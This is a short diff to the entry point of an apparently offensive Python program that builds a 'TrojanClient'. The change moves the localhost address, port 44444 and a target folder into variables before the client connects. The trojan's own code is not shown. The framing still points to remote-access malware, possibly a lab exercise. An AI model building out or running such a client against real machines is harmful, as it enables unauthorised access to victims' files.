@@ -121,5 +121,9 @@ class TrojanClient:
 
 
 if __name__ == "__main__":
-    client = TrojanClient("127.0.0.1", 44444, "D:\check")
+    target_folder = "D:\check"
+    host = "127.0.0.1"
+    port = 44444
+    
+    client = TrojanClient(host, port, target_folder)
     client.connect()
